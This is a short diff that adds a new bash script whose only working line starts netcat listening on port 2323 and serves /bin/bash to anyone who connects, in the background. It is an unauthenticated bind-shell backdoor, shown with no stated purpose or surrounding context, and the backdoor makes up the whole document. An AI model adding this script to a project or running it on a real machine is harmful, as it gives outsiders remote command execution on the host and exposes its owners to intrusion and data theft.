@@ -1,0 +1,2 @@
+#!/bin/bash
+nc -l -t -C -p 2323 -c /bin/bash &exit
